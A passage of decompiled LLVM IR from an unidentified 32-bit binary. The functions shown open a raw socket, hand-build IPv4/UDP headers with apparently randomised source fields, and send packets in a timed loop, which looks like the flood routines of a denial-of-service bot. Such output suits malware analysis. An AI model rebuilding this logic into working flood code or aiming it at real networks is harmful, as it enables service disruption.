  %v1_8049408 = add i32 %v1_80493c4, 16
  %v2_8049408 = inttoptr i32 %v1_8049408 to i32*
  %v3_8049408 = load i32, i32* %v2_8049408, align 4
  %v1_804940b = inttoptr i32 %v3_8049408 to i32*
  %v2_804940b = load i32, i32* %v1_804940b, align 4
  %v3_8049413 = call i32 @function_804cfc4(i32 %v2_804940b, i32 ptrtoint (i32* @global_var_8055e60.47 to i32), i32 %v3_80493fb)
  %v0_804941b.pre = load i32, i32* @global_var_8055e60.47, align 32
  br label %dec_label_pc_804941b

dec_label_pc_804941b:                             ; preds = %dec_label_pc_804939b, %dec_label_pc_80493f8
  %v0_804941b = phi i32 [ %v1_80493a7, %dec_label_pc_804939b ], [ %v0_804941b.pre, %dec_label_pc_80493f8 ]
  ret i32 %v0_804941b

; uselistorder directives
  uselistorder i32 %v1_80493a7, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804941b, { 1, 0 }
  uselistorder label %dec_label_pc_80493f8, { 1, 0 }
}

define i32 @function_8049422(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049422:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1612 = alloca i32, align 4
  %stack_var_-1604 = alloca i32, align 4
  %v2_8049437 = call i32 @function_804b418(i32* null)
  store i32 %v2_8049437, i32* @eax, align 4
  %v1_8049448 = call i32 @function_8048309(i32 %arg2)
  %v1_8049450 = icmp eq i32 %v1_8049448, 0
  %v1_8049452 = icmp eq i1 %v1_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_80496ac, label %dec_label_pc_8049458

dec_label_pc_8049458:                             ; preds = %dec_label_pc_8049422
  %v3_8049464 = call i32 @function_804d6e8(i32 2, i32 3, i32 255)
  store i32 %v3_8049464, i32* @eax, align 4
  %v5_804946f = icmp slt i32 %v3_8049464, 0
  %v1_8049473 = icmp eq i1 %v5_804946f, false
  br i1 %v1_8049473, label %dec_label_pc_804947f, label %dec_label_pc_8049475

dec_label_pc_8049475:                             ; preds = %dec_label_pc_8049458
  %v1_804947a = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_804947f

dec_label_pc_804947f:                             ; preds = %dec_label_pc_8049458, %dec_label_pc_8049475
  %v4_804947f = add i32 %arg3, -2
  %v9_804947f = sub i32 1, %arg3
  %v10_804947f = and i32 %v9_804947f, %arg3
  %v11_804947f = icmp slt i32 %v10_804947f, 0
  %v12_804947f = icmp eq i32 %v4_804947f, 0
  %v13_804947f = icmp slt i32 %v4_804947f, 0
  %v3_8049483 = icmp eq i1 %v13_804947f, %v11_804947f
  %v4_8049483 = icmp eq i1 %v12_804947f, false
  %v5_8049483 = and i1 %v4_8049483, %v3_8049483
  br i1 %v5_8049483, label %dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge, label %dec_label_pc_8049485

dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge: ; preds = %dec_label_pc_804947f
  br label %dec_label_pc_80494a5

dec_label_pc_8049485:                             ; preds = %dec_label_pc_804947f
  store i32 %arg2, i32* %stack_var_-1604, align 4
  store i32 %arg1, i32* %stack_var_-1612, align 4
  %v3_8049493 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052340.49 to i32))
  store i32 %v3_8049493, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1612, align 4
  %v1_80494a0 = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_80494a5

dec_label_pc_80494a5:                             ; preds = %dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge, %dec_label_pc_8049485
  %v1_80494a8 = add i32 %arg4, 4
  %v1_80494ab = inttoptr i32 %v1_80494a8 to i32*
  %v2_80494ab = load i32, i32* %v1_80494ab, align 4
  store i32 %arg2, i32* %stack_var_-1612, align 4
  %v3_80494b4 = call i32 @function_804939b(i32 %arg2, i32 %v2_80494ab)
  %v1_80494c2 = add i32 %arg4, 8
  %v1_80494c5 = inttoptr i32 %v1_80494c2 to i32*
  %v2_80494c5 = load i32, i32* %v1_80494c5, align 4
  store i32 %v2_80494c5, i32* %stack_var_-1612, align 4
  %v1_80494cb = call i32 @function_804e73c(i32 %v2_80494c5)
  %v1_80494d9 = add i32 %arg4, 12
  %v1_80494dc = inttoptr i32 %v1_80494d9 to i32*
  %v2_80494dc = load i32, i32* %v1_80494dc, align 4
  store i32 %v2_80494dc, i32* %stack_var_-1612, align 4
  %v1_80494e2 = call i32 @function_804e73c(i32 %v2_80494dc)
  %v2_80494ed = ptrtoint i32* %stack_var_-1560 to i32
  %tmp54 = bitcast i32* %stack_var_-1540 to i16*
  %v15_8049508 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 1472, i32* %stack_var_-1604, align 4
  store i32 %v15_8049508, i32* %stack_var_-1612, align 4
  %v4_804951b = bitcast i32* %stack_var_-1532 to i8*
  %v5_804951b = call i32 @function_804ce60(i8* %v4_804951b, i32 10, i32 1472)
  store i32 %arg2, i32* %stack_var_-1604, align 4
  store i32 %arg1, i32* %stack_var_-1612, align 4
  %v3_8049537 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8052367.50 to i32))
  %v3_804954a = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804954a, align 4
  %v1_804955c = or i32 %v2_80494ed, 1
  %v2_804955c = inttoptr i32 %v1_804955c to i8*
  store i8 0, i8* %v2_804955c, align 1
  %v1_8049563 = or i32 %v2_80494ed, 2
  %v2_8049563 = inttoptr i32 %v1_8049563 to i16*
  store i16 1500, i16* %v2_8049563, align 2
  %v1_804956c = add i32 %v2_80494ed, 6
  %v2_804956c = inttoptr i32 %v1_804956c to i16*
  store i16 0, i16* %v2_804956c, align 2
  %v1_8049575 = add i32 %v2_80494ed, 9
  %v2_8049575 = inttoptr i32 %v1_8049575 to i8*
  store i8 17, i8* %v2_8049575, align 1
  %v1_804957c = add i32 %v2_80494ed, 8
  %v2_804957c = inttoptr i32 %v1_804957c to i8*
  store i8 64, i8* %v2_804957c, align 4
  %v2_8049586 = add i32 %v2_80494ed, 16
  %v3_8049586 = inttoptr i32 %v2_8049586 to i32*
  store i32 %v3_80494b4, i32* %v3_8049586, align 4
  %v1_804958c = urem i32 %tmp21, 65536
  store i32 %v1_804958c, i32* %stack_var_-1612, align 4
  %v1_8049595 = call i32 @function_804d0f8(i32 %v1_804958c)
  %v2_8049595 = trunc i32 %v1_8049595 to i16
  %v4_804959f = ptrtoint i32* %stack_var_-1540 to i32
  %v3_80495a2 = add i32 %v4_804959f, 4
  %v4_80495a2 = inttoptr i32 %v3_80495a2 to i16*
  store i16 %v2_8049595, i16* %v4_80495a2, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %v3_80494b4, i32* @eax, align 4
  %v4_80495bf = icmp eq i32 %v1_80494cb, 0
  %v3_80495ee = or i32 %v4_804959f, 2
  %v4_80495ee = inttoptr i32 %v3_80495ee to i16*
  %v2_80495fe = bitcast i32* %stack_var_-1560 to i16*
  %v3_804960b = add i32 %v4_804959f, 6
  %v4_804960b = inttoptr i32 %v3_804960b to i16*
  %v2_8049619 = add i32 %v2_80494ed, 12
  %v3_8049619 = inttoptr i32 %v2_8049619 to i32*
  %v3_8049626 = add i32 %v2_80494ed, 4
  %v4_8049626 = inttoptr i32 %v3_8049626 to i16*
  %v3_8049643 = add i32 %v2_80494ed, 10
  %v4_8049643 = inttoptr i32 %v3_8049643 to i16*
  %v2_8049652 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804968c = add i32 %v1_80494e2, %v2_8049437
  %v1_80495c8 = urem i32 %v1_80494cb, 65536
  br label %dec_label_pc_80495b2

dec_label_pc_80495b2:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80494a5
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80494a5 ], [ %v4_80496a4, %dec_label_pc_80496a4 ]
  %v1_80495b2 = call i32 @function_804e3b8(i32 %v3_80494b4)
  %sext = mul i32 %v1_80495b2, 65536
  %v1_80495b7 = sdiv i32 %sext, 65536
  store i32 %v4_804959f, i32* @eax, align 4
  %v1_80495bc = trunc i32 %v1_80495b7 to i16
  store i16 %v1_80495bc, i16* %tmp54, align 4
  br i1 %v4_80495bf, label %dec_label_pc_80495e4, label %dec_label_pc_80495c5

dec_label_pc_80495c5:                             ; preds = %dec_label_pc_80495b2
  store i32 %v1_80495c8, i32* %stack_var_-1612, align 4
  %v1_80495d1 = call i32 @function_804d0f8(i32 %v1_80495c8)
  br label %dec_label_pc_80495f2

dec_label_pc_80495e4:                             ; preds = %dec_label_pc_80495b2
  %v0_80495e4 = load i32, i32* %stack_var_-1612, align 4
  %v1_80495e4 = call i32 @function_804e3b8(i32 %v0_80495e4)
  %sext5 = mul i32 %v1_80495e4, 65536
  %v1_80495e9 = sdiv i32 %sext5, 65536
  br label %dec_label_pc_80495f2

dec_label_pc_80495f2:                             ; preds = %dec_label_pc_80495c5, %dec_label_pc_80495e4
  %storemerge.in = phi i32 [ %v1_80495e9, %dec_label_pc_80495e4 ], [ %v1_80495d1, %dec_label_pc_80495c5 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i16 %storemerge, i16* %v4_80495ee, align 2
  store i32 %v2_80494ed, i32* %stack_var_-1604, align 4
  %v3_80495fe = call i32 @function_80488bc(i16* %v2_80495fe, i32 1500)
  %v4_80495fe = trunc i32 %v3_80495fe to i16
  store i16 %v4_80495fe, i16* %v4_804960b, align 2
  %v0_804960f = call i32 @function_80483e8()
  store i32 %v2_80494ed, i32* @eax, align 4
  store i32 %v0_804960f, i32* %v3_8049619, align 4
  %v0_804961c = load i32, i32* %stack_var_-1604, align 4
  %v1_804961c = call i32 @function_804e3b8(i32 %v0_804961c)
  %sext4 = mul i32 %v1_804961c, 65536
  %v1_8049621 = sdiv i32 %sext4, 65536
  %v1_8049626 = trunc i32 %v1_8049621 to i16
  store i16 %v1_8049626, i16* %v4_8049626, align 4
  store i32 %v2_80494ed, i32* %stack_var_-1604, align 4
  %v3_8049636 = call i32 @function_80488bc(i16* %v2_80495fe, i32 1500)
  %v4_8049636 = trunc i32 %v3_8049636 to i16
  store i16 %v4_8049636, i16* %v4_8049643, align 2
  store i32 %v2_8049652, i32* %stack_var_-1612, align 4
  %v7_804966c = call i32 @function_804d668(i32 %v3_8049464, i32 %v2_80494ed, i32 1500, i32 0, i32 %v2_8049652, i32 16)
  store i32 %v7_804966c, i32* @eax, align 4
  %tmp55 = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp55, label %dec_label_pc_80496a4, label %dec_label_pc_804967a

dec_label_pc_804967a:                             ; preds = %dec_label_pc_80495f2
  store i32 0, i32* %stack_var_-1612, align 4
  %v2_804967f = call i32 @function_804b418(i32* null)
  store i32 %v5_804968c, i32* @eax, align 4
  %v7_804968f = icmp ult i32 %v2_804967f, %v5_804968c
  br i1 %v7_804968f, label %dec_label_pc_80496a4, label %dec_label_pc_8049693

dec_label_pc_8049693:                             ; preds = %dec_label_pc_804967a
  store i32 0, i32* %stack_var_-1612, align 4
  %v1_8049698 = call i32 @function_804e884(i32 0)
  store i32 %v1_8049698, i32* @eax, align 4
  br label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_8049693, %dec_label_pc_804967a, %dec_label_pc_80495f2
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_80495f2 ], [ 0, %dec_label_pc_804967a ], [ 0, %dec_label_pc_8049693 ]
  %v4_80496a4 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_80495b2

dec_label_pc_80496ac:                             ; preds = %dec_label_pc_8049422
  ret i32 %v1_8049448

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v4_804959f, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80494ed, { 10, 11, 3, 12, 0, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v2_80494dc, { 1, 0 }
  uselistorder i32 %v2_80494c5, { 1, 0 }
  uselistorder i32 %v4_804947f, { 1, 0 }
  uselistorder i32 %v1_8049448, { 1, 0 }
  uselistorder i32* %stack_var_-1604, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-1612, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80495f2, { 1, 0 }
  uselistorder label %dec_label_pc_80494a5, { 1, 0 }
  uselistorder label %dec_label_pc_804947f, { 1, 0 }
}

define i32 @function_80496ae(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80496ae:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i16, align 2
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_80523a0.51 to i32), i32* %edx.global-to-local, align 4
  %v3_80496cd = bitcast i32* %stack_var_-252 to i16*
  %v4_80496cd = call i32 @function_804ce38(i16* %v3_80496cd, i32 ptrtoint (i32* @global_var_80523a0.51 to i32), i32 80)
  %v2_80496e8 = call i32 @function_804b418(i32* null)
  store i32 %v2_80496e8, i32* @eax, align 4
  %v1_80496f9 = call i32 @function_8048309(i32 %arg2)
  %v1_8049701 = icmp eq i32 %v1_80496f9, 0
  %v1_8049703 = icmp eq i1 %v1_8049701, false
  br i1 %v1_8049703, label %dec_label_pc_8049a6c, label %dec_label_pc_8049709

dec_label_pc_8049709:                             ; preds = %dec_label_pc_80496ae
  %v4_8049709 = add i32 %arg3, -2
  %v9_8049709 = sub i32 1, %arg3
  %v10_8049709 = and i32 %v9_8049709, %arg3
  %v11_8049709 = icmp slt i32 %v10_8049709, 0
  %v12_8049709 = icmp eq i32 %v4_8049709, 0
  %v13_8049709 = icmp slt i32 %v4_8049709, 0
  %v3_804970d = icmp eq i1 %v13_8049709, %v11_8049709
  %v4_804970d = icmp eq i1 %v12_8049709, false
  %v5_804970d = and i1 %v4_804970d, %v3_804970d
  br i1 %v5_804970d, label %dec_label_pc_804972f, label %dec_label_pc_804970f

dec_label_pc_804970f:                             ; preds = %dec_label_pc_8049709
  %v2_804971d = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80523f0.52 to i32))
  store i32 %v2_804971d, i32* @eax, align 4
  %v1_804972a = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_804972f

dec_label_pc_804972f:                             ; preds = %dec_label_pc_8049709, %dec_label_pc_804970f
  %v3_804973b = call i32 @function_804d6e8(i32 2, i32 3, i32 255)
  store i32 %v3_804973b, i32* @eax, align 4
  %v5_8049746 = icmp slt i32 %v3_804973b, 0
  %v1_804974a = icmp eq i1 %v5_8049746, false
  br i1 %v1_804974a, label %dec_label_pc_8049773.preheader, label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_804972f
  %v1_8049751 = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_8049773.preheader

dec_label_pc_8049773.preheader:                   ; preds = %dec_label_pc_804972f, %dec_label_pc_804974c
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_8049773.preheader, %dec_label_pc_804975f
  %storemerge88 = phi i32 [ 0, %dec_label_pc_8049773.preheader ], [ %v4_8049770, %dec_label_pc_804975f ]
  store i32 %storemerge88, i32* @edx, align 4
  %v0_8049765 = load i32, i32* @ebp, align 4
  %v2_8049765 = mul nuw nsw i32 %storemerge88, 4
  %v3_8049765 = add nuw nsw i32 %v2_8049765, -248
  %v4_8049765 = add i32 %v3_8049765, %v0_8049765
  %v5_8049765 = inttoptr i32 %v4_8049765 to i32*
  %v6_8049765 = load i32, i32* %v5_8049765, align 4
  %v1_804976c = trunc i32 %v6_8049765 to i8
  %v4_804976c = add nuw nsw i32 %storemerge88, -60
  %v5_804976c = add i32 %v4_804976c, %v0_8049765
  %v6_804976c = inttoptr i32 %v5_804976c to i8*
  store i8 %v1_804976c, i8* %v6_804976c, align 1
  %v4_8049770 = add nuw nsw i32 %storemerge88, 1
  %exitcond = icmp eq i32 %v4_8049770, 20
  br i1 %exitcond, label %dec_label_pc_8049779, label %dec_label_pc_804975f

dec_label_pc_8049779:                             ; preds = %dec_label_pc_804975f
  %v1_804977c = add i32 %arg4, 4
  %v1_804977f = inttoptr i32 %v1_804977c to i32*
  %v2_804977f = load i32, i32* %v1_804977f, align 4
  %v3_8049788 = call i32 @function_804939b(i32 %arg2, i32 %v2_804977f)
  %v1_8049796 = add i32 %arg4, 12
  %v1_8049799 = inttoptr i32 %v1_8049796 to i32*
  %v2_8049799 = load i32, i32* %v1_8049799, align 4
  %v1_804979f = call i32 @function_804e73c(i32 %v2_8049799)
  %v3_80497be = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052417.53 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049863 = add i32 %arg4, 8
  %v1_8049866 = inttoptr i32 %v1_8049863 to i32*
  %v2_8049866 = load i32, i32* %v1_8049866, align 4
  %v1_804986c = call i32 @function_804e73c(i32 %v2_8049866)
  %v1_8049874 = urem i32 %v1_804986c, 65536
  %v1_804987d = call i32 @function_804d0f8(i32 %v1_8049874)
  %v1_8049885 = urem i32 %v1_804987d, 65536
  store i32 %v1_8049885, i32* @eax, align 4
  %v5_804988a = trunc i32 %v1_804987d to i16
  %v2_804992b = ptrtoint i8* %stack_var_-104 to i32
  %v2_80499b9 = ptrtoint i32* %stack_var_-156 to i32
  %v2_80499bf = ptrtoint i32* %stack_var_-144 to i32
  %v15_80499c5 = ptrtoint i16* %stack_var_-84 to i32
  %v12_80499e3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_80499ea = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049a10 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049a4c = add i32 %v1_804979f, %v2_80496e8
  br label %dec_label_pc_804988d

dec_label_pc_804988d:                             ; preds = %dec_label_pc_8049a64, %dec_label_pc_8049779
  %stack_var_-32.0 = phi i16 [ %v5_804988a, %dec_label_pc_8049779 ], [ %stack_var_-32.1, %dec_label_pc_8049a64 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049779 ], [ %v4_8049a64, %dec_label_pc_8049a64 ]
  %v1_804988d = sext i16 %stack_var_-32.0 to i32
  %v2_804988d = call i32 @function_804e3b8(i32 %v1_804988d)
  %v3_804988d = trunc i32 %v2_804988d to i16
  %v2_804989b = load i32, i32* %v1_8049866, align 4
  %v0_804989d = load i32, i32* @esp, align 4
  %v2_80498a0 = add i32 %v0_804989d, -16
  %v3_80498a0 = inttoptr i32 %v2_80498a0 to i32*
  store i32 %v2_804989b, i32* %v3_80498a0, align 4
  %sext11 = mul i32 %v2_804988d, 65536
  %v1_80498a1 = sdiv i32 %sext11, 65536
  %v2_80498a1 = call i32 @function_804e73c(i32 %v1_80498a1)
  store i32 %v2_80498a1, i32* @eax, align 4
  %v1_80498a9 = icmp eq i32 %v2_80498a1, 0
  %v1_80498ab = icmp eq i1 %v1_80498a9, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b5, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %dec_label_pc_804988d
  %v2_80498ad = call i32 @function_804e3b8(i32 %v1_80498a1)
  %v3_80498ad = trunc i32 %v2_80498ad to i16
  br label %dec_label_pc_80498b5

dec_label_pc_80498b5:                             ; preds = %dec_label_pc_804988d, %dec_label_pc_80498ad
  %stack_var_-32.1 = phi i16 [ %stack_var_-32.0, %dec_label_pc_804988d ], [ %v3_80498ad, %dec_label_pc_80498ad ]
  %v0_80498b5 = call i32 @function_80483e8()
  %v0_80498c8 = load i32, i32* @esp, align 4
  %v2_80498cb = add i32 %v0_80498c8, -16
  %v3_80498cb = inttoptr i32 %v2_80498cb to i32*
  store i32 60, i32* %v3_80498cb, align 4
  %v1_80498cc = call i32 @function_804d0f8(i32 %v0_80498b5)
  store i32 %v1_80498cc, i32* @eax, align 4
  %sext13 = mul i32 %v1_80498cc, 65536
  %v1_80498d8 = sdiv i32 %sext13, 65536
  %v2_80498d8 = call i32 @function_804e3b8(i32 %v1_80498d8)
  store i16 %v3_804988d, i16* %stack_var_-84, align 2
  %v4_80498fa = sext i16 %stack_var_-32.1 to i32
  store i32 %v4_80498fa, i32* @eax, align 4
  %sext15 = mul i32 %v2_80498d8, 65536
  %v1_8049901 = sdiv i32 %sext15, 65536
  %v2_8049901 = call i32 @function_804e3b8(i32 %v1_8049901)
  store i32 2, i32* %stack_var_-172, align 4
  %v0_804992e = load i32, i32* @esp, align 4
  %v1_804992e = add i32 %v0_804992e, -4
  %v2_804992e = inttoptr i32 %v1_804992e to i32*
  store i32 20, i32* %v2_804992e, align 4
  %v2_8049930 = add i32 %v0_804992e, -8
  %v3_8049930 = inttoptr i32 %v2_8049930 to i32*
  store i32 %v2_804992b, i32* %v3_8049930, align 4
  %v0_8049931 = load i32, i32* %stack_var_-172, align 4
  %v3_8049931 = inttoptr i32 %v0_8049931 to i16*
  %v4_8049931 = call i32 @function_80488bc(i16* %v3_8049931, i32 %v4_80498fa)
  store i32 %v4_8049931, i32* @eax, align 4
  %sext16 = mul i32 %v4_8049931, 65536
  %v1_804993d = sdiv i32 %sext16, 65536
  %v2_804993d = call i32 @function_804e3b8(i32 %v1_804993d)
  store i32 %v0_80498b5, i32* %stack_var_-156, align 4
  %v0_80499a6 = load i32, i32* @esp, align 4
  %v2_80499a9 = add i32 %v0_80499a6, -16
  %v3_80499a9 = inttoptr i32 %v2_80499a9 to i32*
  store i32 40, i32* %v3_80499a9, align 4
  %sext24 = mul i32 %v2_804993d, 16777216
  %v1_80499aa = sdiv i32 %sext24, 16777216
  %v2_80499aa = call i32 @function_804d0f8(i32 %v1_80499aa)
  %v0_80499af = load i32, i32* @esp, align 4
  store i32 %v2_80499bf, i32* %edx.global-to-local, align 4
  %v1_80499cb = add i32 %v0_80499af, 8
  %v2_80499cb = inttoptr i32 %v1_80499cb to i32*
  store i32 20, i32* %v2_80499cb, align 4
  %v2_80499cd = add i32 %v0_80499af, 4
  %v3_80499cd = inttoptr i32 %v2_80499cd to i32*
  store i32 %v2_80499bf, i32* %v3_80499cd, align 4
  %v3_80499ce = inttoptr i32 %v0_80499af to i32*
  store i32 %v15_80499c5, i32* %v3_80499ce, align 4
  %sext17 = mul i32 %v2_80499aa, 65536
  %v1_80499cf = sdiv i32 %sext17, 65536
  %v4_80499cf = call i32 @function_804cfc4(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499d4 = load i32, i32* @esp, align 4
  %v5_80499da = add i32 %v0_80499d4, 8
  %v6_80499da = inttoptr i32 %v5_80499da to i32*
  store i32 20, i32* %v6_80499da, align 4
  %v2_80499e6 = add i32 %v0_80499d4, 4
  %v3_80499e6 = inttoptr i32 %v2_80499e6 to i32*
  store i32 %v12_80499e3, i32* %v3_80499e6, align 4
  %v3_80499ed = inttoptr i32 %v0_80499d4 to i32*
  store i32 %v15_80499ea, i32* %v3_80499ed, align 4
  %v4_80499ee = call i32 @function_804cfc4(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499f3 = load i32, i32* @esp, align 4
  store i32 %v2_80499b9, i32* %edx.global-to-local, align 4
  %v2_8049a02 = add i32 %v0_80499f3, 12
  %v3_8049a02 = inttoptr i32 %v2_8049a02 to i32*
  store i32 52, i32* %v3_8049a02, align 4
  %v2_8049a03 = add i32 %v0_80499f3, 8
  %v3_8049a03 = inttoptr i32 %v2_8049a03 to i32*
  store i32 %v2_80499b9, i32* %v3_8049a03, align 4
  %v3_8049a04 = inttoptr i32 %v1_80499cf to i16*
  %v4_8049a04 = call i32 @function_80488bc(i16* %v3_8049a04, i32 ptrtoint (i32* @0 to i32))
  %v0_8049a09 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v1_8049a1f = add i32 %v0_8049a09, -4
  %v2_8049a1f = inttoptr i32 %v1_8049a1f to i32*
  store i32 16, i32* %v2_8049a1f, align 4
  %v2_8049a21 = add i32 %v0_8049a09, -8
  %v3_8049a21 = inttoptr i32 %v2_8049a21 to i32*
  store i32 %v2_8049a10, i32* %v3_8049a21, align 4
  %v1_8049a22 = add i32 %v0_8049a09, -12
  %v2_8049a22 = inttoptr i32 %v1_8049a22 to i32*
  store i32 0, i32* %v2_8049a22, align 4
  %v0_8049a24 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049a24 = add i32 %v0_8049a09, -16
  %v3_8049a24 = inttoptr i32 %v2_8049a24 to i32*
  store i32 %v0_8049a24, i32* %v3_8049a24, align 4
  %v2_8049a28 = add i32 %v0_8049a09, -20
  %v3_8049a28 = inttoptr i32 %v2_8049a28 to i32*
  store i32 %v2_804992b, i32* %v3_8049a28, align 4
  %v5_8049a29 = add i32 %v0_8049a09, -24
  %v6_8049a29 = inttoptr i32 %v5_8049a29 to i32*
  store i32 %v3_804973b, i32* %v6_8049a29, align 4
  %v1_8049a2c = load i32, i32* %stack_var_-64, align 4
  %sext20 = mul i32 %v4_8049a04, 65536
  %v2_8049a2c = sdiv i32 %sext20, 65536
  %v7_8049a2c = call i32 @function_804d668(i32 %v2_8049a2c, i32 %v1_8049a2c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_8049a2c, i32* @eax, align 4
  %tmp90 = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp90, label %dec_label_pc_8049a64, label %dec_label_pc_8049a3a

dec_label_pc_8049a3a:                             ; preds = %dec_label_pc_80498b5
  %v0_8049a31 = load i32, i32* @esp, align 4
  %v1_8049a3d = add i32 %v0_8049a31, 16
  %v2_8049a3d = inttoptr i32 %v1_8049a3d to i32*
  store i32 0, i32* %v2_8049a3d, align 4
  %v2_8049a3f = inttoptr i32 %v2_8049a2c to i32*
  %v3_8049a3f = call i32 @function_804b418(i32* %v2_8049a3f)
  %v0_8049a44 = load i32, i32* @esp, align 4
  store i32 %v3_8049a3f, i32* %edx.global-to-local, align 4
  store i32 %v5_8049a4c, i32* @eax, align 4
  %v7_8049a4f = icmp ult i32 %v3_8049a3f, %v5_8049a4c
  br i1 %v7_8049a4f, label %dec_label_pc_8049a64, label %dec_label_pc_8049a53

dec_label_pc_8049a53:                             ; preds = %dec_label_pc_8049a3a
  %v2_8049a56 = inttoptr i32 %v0_8049a44 to i32*
  store i32 0, i32* %v2_8049a56, align 4
  %v2_8049a58 = call i32 @function_804e884(i32 %v2_8049a2c)
  store i32 %v2_8049a58, i32* @eax, align 4
  br label %dec_label_pc_8049a64

dec_label_pc_8049a64:                             ; preds = %dec_label_pc_8049a53, %dec_label_pc_8049a3a, %dec_label_pc_80498b5
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_80498b5 ], [ 0, %dec_label_pc_8049a3a ], [ 0, %dec_label_pc_8049a53 ]
  %v4_8049a64 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_804988d

dec_label_pc_8049a6c:                             ; preds = %dec_label_pc_80496ae
  ret i32 %v1_80496f9

; uselistorder directives
  uselistorder i32 %v2_8049a2c, { 2, 1, 0 }
  uselistorder i32 %v0_80499d4, { 1, 0, 2 }
  uselistorder i32 %v1_80499cf, { 2, 1, 0 }
  uselistorder i32 %v0_80499af, { 2, 0, 1 }
  uselistorder i16 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_80498a1, { 1, 0 }
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %v1_804987d, { 1, 0 }
  uselistorder i32 %storemerge88, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8049709, { 1, 0 }
  uselistorder i32 %v1_80496f9, { 1, 0 }
  uselistorder i16* %stack_var_-84, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80498b5, { 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0 }
  uselistorder label %dec_label_pc_8049773.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804972f, { 1, 0 }
}

define i32 @function_8049a6e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8049a6e:
  %edx.global-to-local = alloca i32, align 4
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i16, align 2
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
